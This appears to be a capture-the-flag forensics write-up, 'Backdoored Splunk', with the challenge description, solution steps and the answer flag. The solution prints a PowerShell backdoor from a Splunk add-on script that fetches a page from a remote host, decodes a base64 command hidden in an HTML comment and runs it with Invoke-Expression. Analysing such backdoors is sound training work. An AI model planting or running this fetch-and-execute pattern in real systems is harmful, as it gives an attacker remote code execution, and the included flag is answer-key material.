@@ -1,0 +1,34 @@
+Challenge: Backdoored Splunk
+Category: Forensics
+Difficulty: medium
+Author: Adam Rice
+Description: You've probably seen Splunk being used for good, but have you seen it used for evil?
+
+NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.
+
+Download the file(s) below and press the Start button on the top-right to begin this challenge.
+Attachments: Splunk_TA_Windows.zip
+
+Solution:
+
+1. Grep all files for "flag" "ctf" etc.
+2. Find:
+	a. bin/powershell/nt6-health.ps1:$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
+3. Start the VM on the challenge side
+4. Run the following the send a command to the web host in VM
+	a. 
+
+		$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:30711 -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
+		if ($html -match '<!--(.*?)-->') {
+    	$value = $matches[1]
+    	$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
+    	Invoke-Expression $command
+		})
+
+		$OS
+
+5. Return flag
+	a. flag
+	   60bb3bfaf703e0fa36730ab70e115bd7
+6. Sanitize output: flag{60bb3bfaf703e0fa36730ab70e115bd7}
+
